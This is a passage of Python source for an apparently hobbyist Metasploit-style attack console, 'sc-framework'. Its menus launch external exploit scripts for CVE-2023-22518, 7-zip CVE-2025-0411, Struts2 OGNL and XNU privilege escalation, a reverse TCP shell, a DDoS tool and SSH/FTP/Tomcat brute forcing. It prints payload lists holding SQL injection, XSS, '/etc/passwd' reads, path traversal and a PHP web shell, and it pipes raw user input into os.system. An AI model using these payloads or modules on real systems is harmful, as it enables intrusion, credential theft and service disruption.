        time.sleep(0.5)
        Console()
    elif scconsole24 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploitfindvulnerabiliteswebsite():
    scconsole25 = input("sc~" + color.red + "(site/vuln-curl-website)" + color.white + ">")
    if scconsole25 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "run":
        os.system('python exploits/site/vuln-curl-website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "exploit":
        os.system('python exploits/site/vuln-curl-website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "unuse":
        print("unusing site/vuln-curl-website.")
        time.sleep(0.5)
        Console()
    elif scconsole25 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploitfindvulnerabiliteswebsite2():
    scconsole26 = input("sc~" + color.red + "(site/find-vulnerabilites-website2)" + color.white + ">")
    if scconsole26 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
PAYLOAD          | specify the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "run":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "exploit":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "unuse":
        print("unusing site/find-vulnerabilites-website2.")
        time.sleep(0.5)
        Console()
    elif scconsole26 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploithttplogintest():
    scconsole27 = input("sc~" + color.red + "(site/http-login-test)" + color.white + ">")
    if scconsole27 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploithttplogintest()
    elif scconsole27 == "clear":
        os.system('clear')
        texploithttplogintest()
    elif scconsole27 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        texploithttplogintest()
    elif scconsole27 == "run":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "exploit":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "unuse":
        print("unusing site/http-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole27 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploitZIPexploit():
    scconsole28 = input("sc~" + color.red + "(site/ZIP-exploit)" + color.white + ">")
    if scconsole28 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitZIPexploit()
    elif scconsole28 == "clear":
        os.system('clear')
        texploitZIPexploit()
    elif scconsole28 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url to upload zip file.

you will specifiy these options when you run or exploit it!
""")
        texploitZIPexploit()
    elif scconsole28 == "run":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "exploit":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "unuse":
        print("unusing site/ZIP-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole28 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploittomcatmgrlogin():
    scconsole29 = input("sc~" + color.red + "(site/tomcat-mgr-login)" + color.white + ">")
    if scconsole29 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "clear":
        os.system('clear')
        texploittomcatmgrlogin()
    elif scconsole29 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.
BRUTEFORCE-SPEED | specify the brute force speed.

you will specifiy these options when you run or exploit it!
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "run":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "exploit":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "unuse":
        print("unusing site/tomcat-mgr-login.")
        time.sleep(0.5)
        Console()
    elif scconsole29 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def exploitcve202322518cve202322518():
    scconsole30 = input("sc~" + color.red + "(exploit/cve-2023-22518/cve-2023-22518)" + color.white + ">")
    if scconsole30 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitcve202322518cve202322518()
    elif scconsole30 == "clear":
        os.system('clear')
        exploitcve202322518cve202322518()
    elif scconsole30 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
ZIP              | specify the zip from /sc_framework/exploits/cve-2023-22518/xmlexport-20231109-060519-1.zip .

you will specifiy these options when you run or exploit it!
""")
        exploitcve202322518cve202322518()
    elif scconsole30 == "run":
        os.system('python exploits/cve-2023-22518/cve-2023-22518.py')
        exploitcve202322518cve202322518()
    elif scconsole30 == "exploit":
        os.system('python exploits/cve-2023-22518/cve-2023-22518.py')
        exploitcve202322518cve202322518()
    elif scconsole30 == "unuse":
        print("unusing exploit/cve-2023-22518/cve-2023-22518.")
        time.sleep(0.5)
        Console()
    elif scconsole30 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def exploitvulncve202322518cve202322518():
    scconsole31 = input("sc~" + color.red + "(exploit/cve-2023-22518/vuln-test-for-cve-2023-22518)" + color.white + ">")
    if scconsole31 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "clear":
        os.system('clear')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
URLLIST          | specify the path of url list.

you will specifiy these options when you run or exploit it!
""")
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "run":
        url = input("URL: ")
        urllist = input("URLLIST: ")
        os.system(f'python exploits/cve-2023-22518/vuln-test-for-cve-2023-22518.py --url {url} --file {urllist}')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "exploit":
        url2 = input("URL: ")
        urllist2 = input("URLLIST: ")
        os.system(f'python exploits/cve-2023-22518/vuln-test-for-cve-2023-22518.py --url {url2} --file {urllist2}')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "unuse":
        print("unusing exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
        time.sleep(0.5)
        Console()
    elif scconsole31 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploitDDDAttack():
    scconsole33 = input("sc~" + color.red + "(dos/DD_D_Attack)" + color.white + ">")
    if scconsole33 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitDDDAttack()
    elif scconsole33 == "clear":
        os.system('clear')
        texploitDDDAttack()
    elif scconsole33 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
TIME             | specify the time.

you will specifiy these options when you run or exploit it!
""")
        texploitDDDAttack()
    elif scconsole33 == "run":
        os.system('ruby exploits/dos/DD_D_Attack.rb')
        texploitDDDAttack()
    elif scconsole33 == "exploit":
        os.system('ruby exploits/dos/DD_D_Attack.rb')
        texploitDDDAttack()
    elif scconsole33 == "unuse":
        print("unusing dos/DD_D_Attack.")
        time.sleep(0.5)
        Console()
    elif scconsole33 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def w7zipcve20250411():
    scconsole34 = input("sc~" + color.red + "(windows/7-zip_cve-2025-0411)" + color.white + ">")
    if scconsole34 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        w7zipcve20250411()
    elif scconsole34 == "clear":
        os.system('clear')
        w7zipcve20250411()
    elif scconsole34 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
ATTACKER-PORT    | specify your port.
LISTEN-PORT      | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        w7zipcve20250411()
    elif scconsole34 == "run":
        os.system('./exploits/windows/7-zip_cve-2025-0411')
        w7zipcve20250411()
    elif scconsole34 == "exploit":
        os.system('./exploits/windows/7-zip_cve-2025-0411')
        w7zipcve20250411()
    elif scconsole34 == "unuse":
        print("unusing windows/7-zip_cve-2025-0411.")
        time.sleep(0.5)
        Console()
    elif scconsole34 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tdirectoryfinder():
    scconsole35 = input("sc~" + color.red + "(site/Directory-finder)" + color.white + ">")
    if scconsole35 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tdirectoryfinder()
    elif scconsole35 == "clear":
        os.system('clear')
        tdirectoryfinder()
    elif scconsole35 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url login-page.
URLLIST          | specify the url-list path.

you will specifiy these options when you run or exploit it!
""")
        tdirectoryfinder()
    elif scconsole35 == "run":
        os.system('python exploits/site/Directory-finder.py')
        tdirectoryfinder()
    elif scconsole35 == "exploit":
        os.system('python exploits/site/Directory-finder.py')
        tdirectoryfinder()
    elif scconsole35 == "unuse":
        print("unusing site/Directory-finder.")
        time.sleep(0.5)
        Console()
    elif scconsole35 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tstruts2namespaceognl():
    scconsole36 = input("sc~" + color.red + "(site/struts2_namespace_ognl)" + color.white + ">")
    if scconsole36 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tstruts2namespaceognl()
    elif scconsole36 == "clear":
        os.system('clear')
        tstruts2namespaceognl()
    elif scconsole36 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url login-page.
URLLIST          | specify the url-list path.

you will specifiy these options when you run or exploit it!
""")
        tstruts2namespaceognl()
    elif scconsole36 == "run":
        os.system('python exploits/site/struts2_namespace_ognl.py')
        tstruts2namespaceognl()
    elif scconsole36 == "exploit":
        os.system('python exploits/site/struts2_namespace_ognl.py')
        tstruts2namespaceognl()
    elif scconsole36 == "unuse":
        print("unusing site/struts2_namespace_ognl.")
        time.sleep(0.5)
        Console()
    elif scconsole36 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mexploitsshlogintest():
    scconsole37 = input("sc~" + color.red + "(multi/ssh-login-test)" + color.white + ">")
    if scconsole37 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitsshlogintest()
    elif scconsole37 == "clear":
        os.system('clear')
        mexploitsshlogintest()
    elif scconsole37 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        mexploitsshlogintest()
    elif scconsole37 == "run":
        os.system('python exploits/multi/ssh-login-test.py')
        mexploitsshlogintest()
    elif scconsole37 == "exploit":
        os.system('python exploits/multi/ssh-login-test.py')
        mexploitsshlogintest()
    elif scconsole37 == "unuse":
        print("unusing multi/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole37 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mexploitftplogintest():
    scconsole38 = input("sc~" + color.red + "(multi/ftp-login-test)" + color.white + ">")
    if scconsole38 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitftplogintest()
    elif scconsole38 == "clear":
        os.system('clear')
        mexploitftplogintest()
    elif scconsole38 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        mexploitftplogintest()
    elif scconsole38 == "run":
        os.system('python exploits/multi/ftp-login-test.py')
        mexploitftplogintest()
    elif scconsole38 == "exploit":
        os.system('python exploits/multi/ftp-login-test.py')
        mexploitftplogintest()
    elif scconsole38 == "unuse":
        print("unusing multi/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole38 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mexploitreverseshell():
    scconsole39 = input("sc~" + color.red + "(multi/shell_reverse_tcp)" + color.white + ">")
    if scconsole39 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitreverseshell()
    elif scconsole39 == "clear":
        os.system('clear')
        mexploitreverseshell()
    elif scconsole39 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
LPORT            | specify your port.

you will specifiy these options when you run or exploit it!
""")
        mexploitreverseshell()
    elif scconsole39 == "run":
        os.system('python exploits/multi/shell_reverse_tcp.py')
        mexploitreverseshell()
    elif scconsole39 == "exploit":
        os.system('python exploits/multi/shell_reverse_tcp.py')
        mexploitreverseshell()
    elif scconsole39 == "unuse":
        print("unusing multi/shell_reverse_tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole39 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def osxkernelxnuipfragmentprivesc():
    scconsole40 = input("sc~" + color.red + "(osx/kernel_xnu_ip_fragment_privesc)" + color.white + ">")
    if scconsole40 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "clear":
        os.system('clear')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "run":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc.py')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "exploit":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc.py')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "unuse":
        print("unusing osx/kernel_xnu_ip_fragment_privesc.")
        time.sleep(0.5)
        Console()
    elif scconsole40 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
    
def osxkernelxnuipfragmentprivesc2():
    scconsole41 = input("sc~" + color.red + "(osx/kernel_xnu_ip_fragment_privesc_2)" + color.white + ">")
    if scconsole41 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "clear":
        os.system('clear')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "run":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc_2.py')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "exploit":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc_2.py')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "unuse":
        print("unusing osx/kernel_xnu_ip_fragment_privesc_2.")
        time.sleep(0.5)
        Console()
    elif scconsole41 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def oexploitsshlogintest():
    scconsole42 = input("sc~" + color.red + "(osx/ssh-login-test)" + color.white + ">")
    if scconsole42 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        oexploitsshlogintest()
    elif scconsole42 == "clear":
        os.system('clear')
        oexploitsshlogintest()
    elif scconsole42 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        oexploitsshlogintest()
    elif scconsole42 == "run":
        os.system('python exploits/osx/ssh-login-test.py')
        oexploitsshlogintest()
    elif scconsole42 == "exploit":
        os.system('python exploits/osx/ssh-login-test.py')
        oexploitsshlogintest()
    elif scconsole42 == "unuse":
        print("unusing osx/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole42 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def oexploitftplogintest():
    scconsole43 = input("sc~" + color.red + "(osx/ftp-login-test)" + color.white + ">")
    if scconsole43 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        oexploitftplogintest()
    elif scconsole43 == "clear":
        os.system('clear')
        oexploitftplogintest()
    elif scconsole43 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        oexploitftplogintest()
    elif scconsole43 == "run":
        os.system('python exploits/osx/ftp-login-test.py')
        oexploitftplogintest()
    elif scconsole43 == "exploit":
        os.system('python exploits/osx/ftp-login-test.py')
        oexploitftplogintest()
    elif scconsole43 == "unuse":
        print("unusing osx/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole43 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def lexploitsshlogintest():
    scconsole44 = input("sc~" + color.red + "(linux/ssh-login-test)" + color.white + ">")
    if scconsole44 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitsshlogintest()
    elif scconsole44 == "clear":
        os.system('clear')
        lexploitsshlogintest()
    elif scconsole44 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        lexploitsshlogintest()
    elif scconsole44 == "run":
        os.system('python exploits/linux/ssh-login-test.py')
        lexploitsshlogintest()
    elif scconsole44 == "exploit":
        os.system('python exploits/linux/ssh-login-test.py')
        lexploitsshlogintest()
    elif scconsole44 == "unuse":
        print("unusing linux/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole44 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def lexploitftplogintest():
    scconsole45 = input("sc~" + color.red + "(linux/ftp-login-test)" + color.white + ">")
    if scconsole45 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitftplogintest()
    elif scconsole45 == "clear":
        os.system('clear')
        lexploitftplogintest()
    elif scconsole45 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        lexploitftplogintest()
    elif scconsole45 == "run":
        os.system('python exploits/linux/ftp-login-test.py')
        lexploitftplogintest()
    elif scconsole45 == "exploit":
        os.system('python exploits/linux/ftp-login-test.py')
        lexploitftplogintest()
    elif scconsole45 == "unuse":
        print("unusing linux/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole45 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def treversehttp():
    scconsole46 = input("sc~" + color.red + "(site/reverse_http)" + color.white + ">")
    if scconsole46 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        treversehttp()
    elif scconsole46 == "clear":
        os.system('clear')
        treversehttp()
    elif scconsole46 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        treversehttp()
    elif scconsole46 == "run":
        os.system('python exploits/site/reverse_http.py')
        treversehttp()
    elif scconsole46 == "exploit":
        os.system('python exploits/site/reverse_http.py')
        treversehttp()
    elif scconsole46 == "unuse":
        print("unusing site/reverse_http.")
        time.sleep(0.5)
        Console()
    elif scconsole46 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sserverbrowserautopwn2():
    scconsole47 = input("sc~" + color.red + "(server/browser_autopwn2)" + color.white + ">")
    if scconsole47 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "clear":
        os.system('clear')
        sserverbrowserautopwn2()
    elif scconsole47 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target URL.
PAYLOAD          | specify the payload you want.
PHISHING URL     | specify the phishing url.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "show payloads":
        print("""
<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

<a href=javascript:alert('XSS')>Click Me</a>  ---> cross site XSS Click Me payload.

javascript:alert('XSS')  ---> cross site XSS javascript payload.
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "run":
        targetsite = input("URL: ")
        payload10 = input("PAYLOAD: ")
        phishingurl = input("PHISHING URL: ")
        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite} -p "{payload10}" -ph {phishingurl}')
        sserverbrowserautopwn2()
    elif scconsole47 == "exploit":
        targetsite2 = input("URL: ")
        payload101 = input("PAYLOAD: ")
        phishingurl2 = input("PHISHING URL: ")
        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite2} -p "{payload101}" -ph {phishingurl2}')
        sserverbrowserautopwn2()
    elif scconsole47 == "unuse":
        print("unusing server/browser_autopwn2.")
        time.sleep(0.5)
        Console()
    elif scconsole47 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sserverextracttabledbcolumn():
    scconsole48 = input("sc~" + color.red + "(server/extract_table_db_column)" + color.white + ">")
    if scconsole48 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "clear":
        os.system('clear')
        sserverextracttabledbcolumn()
    elif scconsole48 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target URL.
PAYLOAD          | specify the payload(you don't need to specifiy it uses own payloads!).

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "run":
        os.system(f'python exploits/server/extract_table_db_column.py')
        sserverextracttabledbcolumn()
    elif scconsole48 == "exploit":
        os.system(f'python exploits/server/extract_table_db_column.py')
        sserverextracttabledbcolumn()
    elif scconsole48 == "unuse":
        print("unusing server/extract_table_db_column.")
        time.sleep(0.5)
        Console()
